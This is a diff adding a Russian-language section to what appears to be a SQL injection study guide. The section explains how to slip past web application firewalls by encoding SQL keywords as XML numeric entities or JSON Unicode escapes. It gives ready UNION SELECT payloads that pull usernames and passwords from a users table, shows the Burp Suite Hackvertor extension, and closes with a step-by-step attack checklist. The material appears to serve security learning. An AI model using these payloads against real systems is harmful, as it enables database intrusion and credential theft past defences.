@@ -384,7 +384,43 @@ PortSwigger SQL Injection Cheat Sheet — раздел с OAST-методами.
 **OAST — это последний рубеж, когда всё остальное не работает. Если ты умеешь отправлять DNS-запросы через SQL, ты можешь обойти почти любую защиту.**
 </details>
 
+# 🛡️ Как обойти WAF с помощью кодирования?
+**где можно внедрять?<br>
+Не только в параметрах URL! Любые данные, которые попадают в SQL-запрос:** <br>
+- Параметры строки запроса (?id=1)
+- Тело POST-запроса (формы, JSON, XML)
+- Заголовки HTTP (User-Agent, Cookie)
+- Загружаемые файлы (имена, метаданные)
+- WebSocket-сообщения
 
+**WAF ищут запрещённые слова: SELECT, UNION, INSERT, DROP и т.д. Обход — закодировать одну или несколько букв так, чтобы WAF не узнал слово, а сервер раскодировал перед выполнением.**
+
+### XML-кодирование (числовые сущности)
+Символ	Код	Пример
+S	&#x53;	&#x53;ELECT
+U	&#x55;	&#x55;NION
+F	&#x46;	&#x46;ROM
+'	&apos; или &#x27;	username || &apos;~&apos; || password
+### Пример payload в XML:
+<storeId>1 &#x55;NION &#x53;ELECT username || &apos;~&apos; || password &#x46;ROM users--</storeId>
+### JSON-кодирование (Unicode)
+Символ	Код	Пример
+S	\u0053	\u0053ELECT
+U	\u0055	\u0055NION
+### Пример payload в JSON:
+{"storeId": "1 \u0055NION \u0053ELECT username FROM users"}<br>
+### Hackvertor (для Burp Suite) <br>
+Установи расширение Hackvertor, тогда можно писать понятный код внутри тегов:<br>
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users</@hex_entities></storeId><br>
+Hackvertor сам закодирует все буквы в hex-сущности.<br>
+
+### 📋 Пошаговый чек-лист для атаки через XML
+Перехвати запрос (Burp Suite) — найдите POST с XML-телом.<br>
+Определи место вставки — обычно внутри тега, например <storeId>.<br>
+Проверь количество столбцов — используй UNION SELECT NULL, NULL, ... пока не получишь ответ без ошибок.<br>
+Кодируй ключевые слова — замени первые буквы U и S на &#x55; и &#x53;.<br>
+Вставь payload и отправь.<br>
+Если ответ содержит данные — атака удалась.<br>
 
 
 
